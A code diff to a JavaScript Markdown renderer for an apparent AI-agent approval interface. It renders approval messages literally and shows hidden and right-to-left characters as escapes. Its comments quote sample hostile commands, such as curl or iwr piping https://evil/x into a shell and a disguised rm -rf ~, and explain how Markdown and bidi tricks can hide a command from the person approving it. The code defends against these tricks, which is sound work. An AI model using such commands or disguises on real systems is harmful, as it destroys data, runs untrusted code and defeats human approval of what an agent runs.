@@ -12,7 +12,11 @@
 // strong, strikethrough, code spans, fenced code (wrapped, with a Copy button), bullet,
 // numbered and task lists (nested), block quotes, rules, GitHub tables, links, autolinks and
 // bare URLs. Images become links, never loads. Not covered: reference links, footnotes,
-// indented code, HTML.
+// indented code, HTML. Code, and all of an approval's message, is drawn left to right with what
+// is not on screen as it runs shown as escapes (hidden-text.js, #220), and Copy takes what is drawn.
+// An approval's message is never Markdown: it is drawn exactly as written (parseApproval).
+
+import { notesFor, revealLineSeparators, reveal } from './hidden-text.js';
 
 const SAFE_PROTOCOLS = new Set(['http:', 'https:', 'mailto:']);
 const MAX_DEPTH = 12;
@@ -78,8 +82,71 @@ function isTableSep(line) { return RE.tableSep.test(line) && line.includes('-') 
 
 export function parseMarkdown(src) {
   const text = typeof src === 'string' ? src : '';
-  const raw = text.replace(/\r\n?/g, '\n').split('\n');
-  return parseBlocks(raw.map(expandTabs), raw, 0);
+  const kept = standIns(text.replace(/\r\n/g, '\n'));
+  const raw = kept.text.split('\n');
+  return kept.restore(parseBlocks(raw.map(expandTabs), raw, 0));
+}
+
+// A bare carriage return and the line and paragraph separators end no line in a shell, so they
+// end none here: each stays in its line as the character it is, for a block to draw as an escape
+// and to say it held (hidden-text.js notesFor). Escaping them before parsing, as this once did,
+// left a block unable to tell `\u000D` it held from a carriage return. JavaScript's `.` and `$`
+// stop at them, though, so while the parser reads the text each stands in as a private-use
+// character the text does not hold, and is put back in what the parser made.
+const SEPARATORS = /[\r\u2028\u2029]/;
+function standIns(text) {
+  if (!SEPARATORS.test(text)) { return { text, restore: (nodes) => nodes }; }
+  const by = new Map();
+  // The private-use code points the text holds, read once: a check per candidate read the whole
+  // text again, so a message holding U+F0000 onward took seconds to parse (#429).
+  const present = new Set();
+  for (const ch of text) { const c = ch.codePointAt(0); if (c >= 0xF0000 || (c >= 0xE000 && c <= 0xF8FF)) { present.add(c); } }
+  for (const [from, to] of [[0xF0000, 0x10FFFD], [0xE000, 0xF8FF]]) {
+    for (let c = from; c <= to && by.size < 3; c++) {
+      if (!present.has(c)) { by.set(['\r', '\u2028', '\u2029'][by.size], String.fromCodePoint(c)); }
+    }
+  }
+  // A text holding nearly every private-use code point leaves none to stand in: its separators are
+  // escaped before parsing instead, drawn the same, though a block cannot then say it held them.
+  if (by.size < 3) { return { text: text.replace(new RegExp(SEPARATORS.source, 'g'), (c) => revealLineSeparators(c)), restore: (nodes) => nodes }; }
+  const back = new Map([...by].map(([k, v]) => [v, k]));
+  const there = new RegExp([...back.keys()].join('|'), 'gu');
+  const put = (s) => s.replace(there, (c) => back.get(c));
+  // A link whose address held one is no link, as one with a control character never is (safeHref).
+  const held = [...back.keys()].map(encodeURIComponent);
+  const restore = (nodes) => nodes.map((n) => {
+    if (typeof n === 'string') { return put(n); }
+    if (!n || typeof n !== 'object') { return n; }
+    const out = { ...n, children: restore(n.children ?? []) };
+    if (n.attrs) {
+      out.attrs = Object.fromEntries(Object.entries(n.attrs)
+        .filter(([k, v]) => !(k === 'href' && held.some((h) => String(v).toUpperCase().includes(h))))
+        .map(([k, v]) => [k, typeof v === 'string' ? put(v) : v]));
+    }
+    return out;
+  });
+  return { text: text.replace(new RegExp(SEPARATORS.source, 'g'), (c) => by.get(c)), restore };
+}
+
+// An approval's message as its card reads it (#220, #415): exactly as written, all of it, fence
+// markers included; nothing in it is read as Markdown. Approve once allows what runs, and every
+// structure a parser decides hid some of it. A Codex approval carries its command in prose: a link
+// drew `echo "[safe](https://a/";curl${IFS}https://evil/x|sh;")"` as `echo "safe"`, a code span
+// joined two lines into one comment, a backslash escape dropped its backslash, and emphasis
+// dropped a glob's stars. And a line of three backticks, a fence's marker, is a command
+// substitution in bash: `bash -c '` around a fenced `echo rm -rf ~` drew as a harmless echo in a
+// box, while bash runs `rm -rf ~`. So it is one block of text in the code face, its line breaks
+// kept (pre-wrap); only blank lines at its very start and end are left out. A bare CR stays the
+// character it is, drawn as an escape (revealed).
+export function parseApproval(src) {
+  const text = typeof src === 'string' ? src : '';
+  const lines = text.replace(/\r\n/g, '\n').split('\n');
+  // Indices, not shift(): each shift moves every line after it, quadratic in a long blank head.
+  let start = 0;
+  let end = lines.length;
+  while (start < end && blank(lines[start])) { start++; }
+  while (end > start && blank(lines[end - 1])) { end--; }
+  return end > start ? [el('p', [lines.slice(start, end).join('\n')], { class: 'md-literal' })] : [];
 }
 
 // lines: what structure is read from, leading tabs expanded and blank lines in list items
@@ -428,7 +495,7 @@ function parseEmphasis(text, i, noCloser) {
 
 const TAGS = new Set(['p', 'h4', 'h5', 'h6', 'strong', 'em', 'del', 'code', 'pre', 'ul', 'ol', 'li',
   'blockquote', 'hr', 'br', 'a', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'div']);
-const CLASSES = new Set(['al-c', 'al-r', 'md-table']);
+const CLASSES = new Set(['al-c', 'al-r', 'md-table', 'md-literal']);
 
 // Builds the tree with createElement and text nodes only. Each tag and attribute is checked
 // again here, so nothing a parser bug could produce reaches the page unchecked.
@@ -438,14 +505,72 @@ export function toDom(nodes, doc = document) {
   return frag;
 }
 
+const RTL_TOO = { rightToLeft: true };
+
+// What a code block draws and its Copy takes (#220, ui.md §6.4): the agent's text with every
+// character that is not on screen as it runs, right-to-left letters included, as an escape
+// (hidden-text.js reveal), and without the blank lines a fence may end with, which draw as nothing
+// (and pasted, would run the last line). A line of only spaces or tabs is as blank: copying
+// `echo safe\n    ` took the newline too, and ran the command on paste instead of leaving it for
+// inspection (#429). The last line that holds anything keeps its own trailing spaces.
+// A bidi isolate can otherwise draw
+// `echo ok # check; iwr https://evil/x | iex`, a harmless comment, for a command that runs the
+// download; so Copy takes the escapes too, and a shell gets `\u2067` literally, never a command the
+// person did not see.
+export const codeText = (text) => trimBlankTail(reveal(text, RTL_TOO));
+
+// The blank lines at a block's end, empty or of only whitespace, off; the last line that holds
+// anything keeps its own trailing spaces. A backward scan, linear: the regex it replaces,
+// unanchored at its start, was retried from every newline, so thousands of blank lines stalled the
+// render (#429).
+function trimBlankTail(s) {
+  let end = s.length;
+  for (let i = s.length - 1; i >= 0; i--) {
+    const c = s[i];
+    if (c === '\n') { end = i; continue; }
+    if (/\s/.test(c)) { continue; }
+    break;
+  }
+  return s.slice(0, end);
+}
+
+// An approval's whole message as its card draws it (#220): its literal text (parseApproval) with
+// what is not on screen as it runs, right-to-left letters included, as escapes.
+export function revealed(nodes) {
+  return (nodes ?? []).map((n) => {
+    if (typeof n === 'string') { return reveal(n, RTL_TOO); }
+    if (!n || typeof n !== 'object') { return n; }
+    return { ...n, children: revealed(n.children) };
+  });
+}
+
 function build(node, doc) {
-  if (typeof node === 'string') { return doc.createTextNode(node); }
+  // Prose draws a bare CR, NEL and the line and paragraph separators as escapes in their line.
+  if (typeof node === 'string') { return doc.createTextNode(revealLineSeparators(node)); }
   if (!node || !TAGS.has(node.tag)) { return doc.createTextNode(''); }
+  // The Copy button is made here and never by the parser: 'button' is not in TAGS, so no
+  // reply text can produce one, and the only handler on it is ours.
+  if (node.tag === 'pre') { return codeBlock(textOf(node), doc); }
   const e = doc.createElement(node.tag);
   const a = node.attrs ?? {};
+  if (node.tag === 'code') {
+    // A code span reads as a block does, in the order it runs (#220): `rm -rf ~` behind Hebrew
+    // letters reads commented out even in a sentence.
+    e.setAttribute('dir', 'ltr');
+    e.append(doc.createTextNode(reveal(textOf(node), RTL_TOO)));
+    return e;
+  }
   if (node.tag === 'a') {
     const href = safeHref(a.href);
-    if (!href) { return doc.createTextNode(textOf(node)); }
+    // A link that is no link (its address refused here, or holding a bare CR or separator,
+    // parseMarkdown) keeps its words drawn as they would be inside it: a code span in its label
+    // stays a code span, escaped and isolated. Flattened to text, its bidi controls and
+    // right-to-left letters drew raw (#429).
+    if (!href) {
+      const words = doc.createDocumentFragment();
+      for (const child of node.children ?? []) { words.append(build(child, doc)); }
+      return words;
+    }
     e.setAttribute('href', href);
     e.setAttribute('target', '_blank');
     e.setAttribute('rel', 'noopener noreferrer nofollow');
@@ -454,9 +579,6 @@ function build(node, doc) {
   if (node.tag === 'ol' && /^\d{1,9}$/.test(a.start ?? '')) { e.setAttribute('start', a.start); }
   if (CLASSES.has(a.class)) { e.className = a.class; }
   for (const child of node.children ?? []) { e.append(build(child, doc)); }
-  // The Copy button is made here and never by the parser: 'button' is not in TAGS, so no
-  // reply text can produce one, and the only handler on it is ours.
-  if (node.tag === 'pre') { return codeBlock(e, textOf(node), doc); }
   return e;
 }
 
@@ -464,9 +586,18 @@ const COPY_RESET_MS = 1500;
 
 // A code block with a Copy button in its top-right corner. On a phone, a long command (a
 // 1000-character pwsh -EncodedCommand, say) is all but impossible to select by hand. What
-// is copied is the block's text as the agent wrote it, not as it is wrapped on screen.
-// The button sits beside the <pre>, not in it, so the block's own text stays the code.
-function codeBlock(pre, text, doc) {
+// is copied is exactly what the block draws (codeText), not as it is wrapped on screen.
+// The button sits above the <pre>, not in it, so the block's own text stays the code.
+// The block reads strictly left to right (dir="ltr", isolated in app.css), never in a direction
+// guessed from its letters.
+function codeBlock(raw, doc) {
+  const text = codeText(raw);
+  const code = doc.createElement('code');
+  code.setAttribute('dir', 'ltr');
+  code.append(doc.createTextNode(text));
+  const pre = doc.createElement('pre');
+  pre.setAttribute('dir', 'ltr');
+  pre.append(code);
   const label = doc.createElement('span');
   label.textContent = 'Copy';
   const button = doc.createElement('button');
@@ -492,10 +623,34 @@ function codeBlock(pre, text, doc) {
       delete button.dataset.copy;
     }, COPY_RESET_MS);
   });
+  // The notes and Copy sit in a header above the code, in the flow: its real height pushes the code
+  // down, however the notes wrap in a narrow block or at a large text size. Laid over the code's
+  // padding instead, two wrapped notes covered its first lines (#429).
+  const head = doc.createElement('div');
+  head.className = 'md-code-head';
+  const notes = notesOf(raw, doc);
+  if (notes) { head.append(notes); }
+  head.append(button);
   const wrap = doc.createElement('div');
   wrap.className = 'md-code';
-  wrap.append(button, pre, status);
+  wrap.append(head, pre, status);
   return wrap;
+}
+
+// What a drawn block held that its escapes stand for, said in words beside it (ui.md §6.4):
+// "Contains hidden characters", "Contains right-to-left text", or both.
+function notesOf(raw, doc) {
+  const said = notesFor(raw);
+  if (said.length === 0) { return null; }
+  const notes = doc.createElement('div');
+  notes.className = 'md-notes';
+  for (const words of said) {
+    const note = doc.createElement('span');
+    note.className = 'md-note';
+    note.textContent = words;
+    notes.append(note);
+  }
+  return notes;
 }
 
 // Puts text on the clipboard; true if it got there. The Clipboard API first. It is missing
@@ -541,6 +696,16 @@ export function textOf(node) {
   return (node?.children ?? []).map(textOf).join('');
 }
 
-export function renderMarkdown(text, doc = document) {
-  return toDom(parseMarkdown(text), doc);
+// approval: the text is an approval's message, drawn as its card draws it: exactly as written,
+// revealed, never Markdown (parseApproval), and saying what hidden characters or right-to-left
+// letters it held, as a code block does. It has no Copy: it would take the whole message, prose and
+// fence lines too, and pasted into bash a line of backticks runs as a command substitution. The
+// caller reads its container left to right.
+export function renderMarkdown(text, doc = document, { approval = false } = {}) {
+  if (!approval) { return toDom(parseMarkdown(text), doc); }
+  const nodes = parseApproval(text);
+  const frag = toDom(revealed(nodes), doc);
+  const notes = nodes.length ? notesOf(textOf(nodes[0]), doc) : null;
+  if (notes) { frag.prepend(notes); }
+  return frag;
 }
